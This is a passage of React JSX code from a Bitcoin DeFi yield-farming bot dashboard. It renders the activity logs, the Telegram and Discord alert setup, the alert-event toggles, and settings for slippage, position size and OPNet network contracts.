                          <td style={{ ...A.td, fontFamily: "'JetBrains Mono', monospace", fontSize: 11 }}>#{tx.block}</td>
                          <td style={A.td}>{tx.fee}</td>
                          <td style={{ ...A.td, fontSize: 10, color: T.sub }}>{new Date(tx.ts).toLocaleTimeString()}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </div>
            </div>
          )}

          {tab === "logs" && (
            <div style={A.card}>
              <div style={A.cardHead}><h2 style={A.cardTitle}>Activity</h2><button onClick={() => setLogs([])} style={{ padding:"4px 12px",background:"none",border:"1px solid #222",borderRadius:6,color:"#666",fontSize:11,cursor:"pointer" }}>Clear</button></div>
              <div style={{ maxHeight:500,overflowY:"auto",fontFamily:"'JetBrains Mono',monospace",fontSize:12,lineHeight:1.8 }}>
                {logs.length===0 && <div style={{ textAlign:"center",color:"#444",padding:40 }}>Start the bot to see activity.</div>}
                {logs.map(l => (
                  <div key={l.id} style={{ padding:"5px 12px",borderLeft:`3px solid ${l.type==="success"?"#00e676":l.type==="warning"?"#ff9800":"#222"}`,margin:"1px 0" }}>
                    <span style={{ color:"#444",marginRight:10,fontSize:10 }}>{l.ts}</span>
                    <span style={{ color:l.type==="success"?"#00e676":l.type==="warning"?"#ff9800":"#888" }}>{l.msg}</span>
                  </div>
                ))}
                <div ref={logsEnd} />
              </div>
            </div>
          )}

          {/* ── NOTIFICATIONS ── */}
          {tab === "notify" && (
            <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr", gap: 16 }}>
              <div style={{ ...A.card, background: T.card, borderColor: T.border }}>
                <div style={A.cardHead}><h2 style={{ ...A.cardTitle, color: T.text }}>Telegram</h2></div>
                <div style={{ fontSize: 12, color: T.sub, marginBottom: 12 }}>Send bot alerts to a Telegram chat via Bot API</div>
                <div style={{ marginBottom: 12 }}>
                  <div style={{ fontSize: 12, fontWeight: 600, color: T.text, marginBottom: 4 }}>Bot Token + Chat ID</div>
                  <input value={notifTg} onChange={e => setNotifTg(e.target.value)} placeholder="bot123456:ABC.../chat_id/-100123456" style={{ width: "100%", padding: "10px 12px", background: T.input, border: `1px solid ${T.border}`, borderRadius: 8, color: T.text, fontSize: 12, outline: "none", fontFamily: "inherit" }} />
                  <div style={{ fontSize: 10, color: T.sub, marginTop: 4 }}>Format: BOT_TOKEN/CHAT_ID (e.g. 123456:ABC-DEF/-1001234567890)</div>
                </div>
                <button onClick={() => {
                  if (!notifTg) return;
                  const [token, chatId] = notifTg.split("/").filter(Boolean);
                  if (token && chatId) {
                    addLog(`Telegram alerts configured for chat ${chatId.slice(0,6)}...`, "success");
                    setNotifEnabled(true);
                  } else {
                    addLog("Invalid Telegram format. Use: BOT_TOKEN/CHAT_ID", "warning");
                  }
                }} style={{ ...A.connectBtn, width: "100%", opacity: notifTg ? 1 : 0.5 }}>
                  {notifEnabled && notifTg ? "✓ Connected" : "Connect Telegram"}
                </button>
              </div>

              <div style={{ ...A.card, background: T.card, borderColor: T.border }}>
                <div style={A.cardHead}><h2 style={{ ...A.cardTitle, color: T.text }}>Discord</h2></div>
                <div style={{ fontSize: 12, color: T.sub, marginBottom: 12 }}>Send alerts via Discord webhook</div>
                <div style={{ marginBottom: 12 }}>
                  <div style={{ fontSize: 12, fontWeight: 600, color: T.text, marginBottom: 4 }}>Webhook URL</div>
                  <input value={notifDc} onChange={e => setNotifDc(e.target.value)} placeholder="https://discord.com/api/webhooks/..." style={{ width: "100%", padding: "10px 12px", background: T.input, border: `1px solid ${T.border}`, borderRadius: 8, color: T.text, fontSize: 12, outline: "none", fontFamily: "inherit" }} />
                </div>
                <button onClick={() => {
                  if (notifDc && notifDc.includes("discord.com/api/webhooks")) {
                    addLog(`Discord webhook configured`, "success");
                    setNotifEnabled(true);
                  } else { addLog("Invalid Discord webhook URL", "warning"); }
                }} style={{ ...A.connectBtn, width: "100%", opacity: notifDc ? 1 : 0.5 }}>
                  {notifEnabled && notifDc ? "✓ Connected" : "Connect Discord"}
                </button>
              </div>

              <div style={{ ...A.card, background: T.card, borderColor: T.border, gridColumn: isMobile ? "1" : "1 / -1" }}>
                <div style={A.cardHead}><h2 style={{ ...A.cardTitle, color: T.text }}>Alert Events</h2></div>
                <div style={{ fontSize: 12, color: T.sub, marginBottom: 12 }}>Choose which events trigger notifications</div>
                {[
                  ["harvest", "Harvest Rewards", "Notify when rewards are harvested from pools"],
                  ["rotation", "Pool Rotation", "Notify when bot rotates positions between pools"],
                  ["block", "New Block", "Notify on every new Bitcoin block (frequent)"],
                  ["error", "Errors & Warnings", "Notify on failed transactions or high slippage"],
                ].map(([k, title, desc]) => (
                  <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 0", borderBottom: `1px solid ${T.border}` }}>
                    <div><div style={{ fontWeight: 600, color: T.text }}>{title}</div><div style={{ fontSize: 11, color: T.sub }}>{desc}</div></div>
                    <button onClick={() => setNotifEvents(prev => ({ ...prev, [k]: !prev[k] }))} style={{ width: 44, height: 24, borderRadius: 12, border: "none", cursor: "pointer", background: notifEvents[k] ? "#ff9800" : T.input, position: "relative" }}>
                      <div style={{ width: 20, height: 20, borderRadius: "50%", background: "#fff", position: "absolute", top: 2, transition: "transform 200ms", transform: notifEvents[k] ? "translateX(20px)" : "translateX(2px)" }} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── SETTINGS ── */}
          {tab === "settings" && (
            <div style={{ display:"grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr", gap:16 }}>
              <div style={A.card}>
                <div style={A.cardHead}><h2 style={A.cardTitle}>Parameters</h2></div>
                {[["Auto-Compound","Reinvest rewards automatically",autoCompound,()=>setAutoCompound(!autoCompound)],["Gas Optimization","Batch transactions",gasOpt,()=>setGasOpt(!gasOpt)]].map(([t,d,v,fn],i)=>(
                  <div key={i} style={{ display:"flex",justifyContent:"space-between",alignItems:"center",padding:"12px 0",borderBottom:"1px solid #111" }}>
                    <div><div style={{ fontWeight:600 }}>{t}</div><div style={{ fontSize:11,color:"#555" }}>{d}</div></div>
                    <button onClick={fn} style={{ width:44,height:24,borderRadius:12,border:"none",cursor:"pointer",background:v?"#ff9800":"#1a1a1a",position:"relative" }}>
                      <div style={{ width:20,height:20,borderRadius:"50%",background:"#fff",position:"absolute",top:2,transition:"transform 200ms",transform:v?"translateX(20px)":"translateX(2px)" }} />
                    </button>
                  </div>
                ))}
                <div style={{ marginTop:16 }}>
                  <div style={{ fontWeight:600,marginBottom:8 }}>Slippage</div>
                  <div style={{ display:"flex",gap:6 }}>{[0.5,1,2,5].map(v => <button key={v} onClick={()=>setSlippage(v)} style={{ padding:"6px 14px",background:slippage===v?"#ff9800":"#111",border:"1px solid #222",borderRadius:6,color:slippage===v?"#000":"#888",fontSize:12,fontWeight:600,cursor:"pointer" }}>{v}%</button>)}</div>
                </div>
                <div style={{ marginTop:16 }}>
                  <div style={{ fontWeight:600,marginBottom:8 }}>Harvest Threshold</div>
                  <input type="range" min="10" max="500" value={threshold} onChange={e=>setThreshold(+e.target.value)} style={{ width:"100%",accentColor:"#ff9800" }} />
                  <div style={{ fontSize:13,color:"#ff9800",fontWeight:600,marginTop:4 }}>${threshold}</div>
                </div>
              </div>

              {/* Position Size Card */}
              <div style={{ display:"flex",flexDirection:"column",gap:16 }}>
                <div style={A.card}>
                  <div style={A.cardHead}><h2 style={A.cardTitle}>Position Size</h2><span style={A.cardBadge}>{fmtBtc(posSize)}</span></div>
                  <div style={{ fontSize:12,color:"#666",marginBottom:14 }}>BTC amount the bot uses per deposit, rotation, and rebalance operation</div>

                  {/* Preset buttons */}
                  <div style={{ display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:6,marginBottom:14 }}>
                    {[0.001, 0.005, 0.01, 0.05].map(v => (
                      <button key={v} onClick={() => { setPosSize(v); addLog(`Position size set to ${fmtBtc(v)}`, "info"); }}
                        style={{ padding:"10px 0",background:posSize===v?"#ff9800":"#0e0e14",border:posSize===v?"1px solid #ff9800":`1px solid #1a1a20`,borderRadius:8,color:posSize===v?"#000":"#ccc",fontSize:13,fontWeight:700,cursor:"pointer",transition:"all 200ms" }}>
                        {v} BTC
                      </button>
                    ))}
                  </div>

                  {/* More presets row */}
                  <div style={{ display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:6,marginBottom:14 }}>
                    {[0.1, 0.25, 0.5, 1.0].map(v => (
                      <button key={v} onClick={() => { setPosSize(v); addLog(`Position size set to ${fmtBtc(v)}`, "info"); }}
                        style={{ padding:"10px 0",background:posSize===v?"#ff9800":"#0e0e14",border:posSize===v?"1px solid #ff9800":`1px solid #1a1a20`,borderRadius:8,color:posSize===v?"#000":"#ccc",fontSize:13,fontWeight:700,cursor:"pointer",transition:"all 200ms" }}>
                        {v} BTC
                      </button>
                    ))}
                  </div>

                  {/* Custom input */}
                  <div style={{ display:"flex",gap:8,alignItems:"center" }}>
                    <div style={{ position:"relative",flex:1 }}>
                      <span style={{ position:"absolute",right:12,top:"50%",transform:"translateY(-50%)",color:"#555",fontSize:12,fontWeight:600 }}>BTC</span>
                      <input
                        type="number" min="0.0001" max="100" step="0.001"
                        value={posSize}
                        onChange={e => { const v = Math.max(0.0001, Math.min(100, +e.target.value || 0.0001)); setPosSize(parseFloat(v.toFixed(8))); }}
                        onBlur={() => addLog(`Position size set to ${fmtBtc(posSize)}`, "info")}
                        style={{ width:"100%",padding:"10px 50px 10px 12px",background:"#0a0a0e",border:"1px solid #1a1a20",borderRadius:8,color:"#ff9800",fontSize:16,fontWeight:700,outline:"none",fontVariantNumeric:"tabular-nums",fontFamily:"inherit" }}
                      />
                    </div>
                    <button onClick={() => { setPosSize(parseFloat(Math.min(posSize * 2, 100).toFixed(8))); addLog(`Position size doubled to ${fmtBtc(Math.min(posSize * 2, 100))}`, "info"); }}
                      style={{ padding:"10px 14px",background:"#0e0e14",border:"1px solid #1a1a20",borderRadius:8,color:"#ff9800",fontSize:12,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap" }}>
                      x2
                    </button>
                    <button onClick={() => { setPosSize(parseFloat(Math.max(posSize / 2, 0.0001).toFixed(8))); addLog(`Position size halved to ${fmtBtc(Math.max(posSize / 2, 0.0001))}`, "info"); }}
                      style={{ padding:"10px 14px",background:"#0e0e14",border:"1px solid #1a1a20",borderRadius:8,color:"#888",fontSize:12,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap" }}>
                      /2
                    </button>
                  </div>

                  {/* Slider */}
                  <div style={{ marginTop:12 }}>
                    <input type="range" min="0.001" max="1" step="0.001" value={Math.min(posSize, 1)} onChange={e => setPosSize(parseFloat((+e.target.value).toFixed(8)))} style={{ width:"100%",accentColor:"#ff9800" }} />
                    <div style={{ display:"flex",justifyContent:"space-between",fontSize:10,color:"#444",marginTop:2 }}>
                      <span>0.001 BTC</span><span>1 BTC</span>
                    </div>
                  </div>

                  {/* Strategy context */}
                  <div style={{ marginTop:14,padding:"10px 12px",background:"#08080c",borderRadius:8,border:"1px solid #111" }}>
                    <div style={{ fontSize:11,color:"#666",marginBottom:6 }}>With current strategy ({STRATEGIES.find(s=>s.id===strategy)?.name}):</div>
                    <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:8 }}>
                      <div>
                        <div style={{ fontSize:10,color:"#444",textTransform:"uppercase",letterSpacing:"0.06em" }}>Per Deposit</div>
                        <div style={{ fontSize:15,fontWeight:800,color:"#ff9800" }}>{fmtBtc(posSize)}</div>
                      </div>
                      <div>
                        <div style={{ fontSize:10,color:"#444",textTransform:"uppercase",letterSpacing:"0.06em" }}>Max Exposure</div>
                        <div style={{ fontSize:15,fontWeight:800,color:"#ccc" }}>{fmtBtc(posSize * pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length)}</div>
                      </div>
                      <div>
                        <div style={{ fontSize:10,color:"#444",textTransform:"uppercase",letterSpacing:"0.06em" }}>Eligible Pools</div>
                        <div style={{ fontSize:15,fontWeight:800,color:"#00e676" }}>{pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length}</div>
                      </div>
                      <div>
                        <div style={{ fontSize:10,color:"#444",textTransform:"uppercase",letterSpacing:"0.06em" }}>Est. Daily Yield</div>
                        <div style={{ fontSize:15,fontWeight:800,color:"#00e676" }}>
                          {fmtBtc(posSize * pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length * (pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).reduce((s,p)=>s+p.apr,0) / pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, STRATEGIES.find(s=>s.id===strategy)?.maxRisk)).length || 1) / 100 / 365)}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* OPNet Config */}
                <div style={A.card}>
                  <div style={A.cardHead}><h2 style={A.cardTitle}>OPNet Config</h2></div>
                  <div style={{ marginBottom:14 }}>
                    <div style={{ fontWeight:600,marginBottom:6 }}>Network</div>
                    <select value={network} onChange={e=>setNetwork(e.target.value)} style={{ ...A.sel, width:"100%" }}>
                      <option value="regtest">Regtest</option><option value="testnet">Testnet</option><option value="mainnet">Mainnet</option>
                    </select>
                  </div>
                  {[["RPC", CONTRACTS[network]?.RPC],["Router", CONTRACTS[network]?.MOTOSWAP_ROUTER],["Staking", CONTRACTS[network]?.STAKING]].map(([l,v])=>(
                    <div key={l} style={{ marginBottom:12 }}>
                      <div style={{ fontWeight:600,marginBottom:4,fontSize:12 }}>{l}</div>
                      <code style={{ fontSize:10,color:"#555",background:"#0a0a0a",padding:"8px 12px",borderRadius:6,display:"block",wordBreak:"break-all",border:"1px solid #151515" }}>{v||"N/A"}</code>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
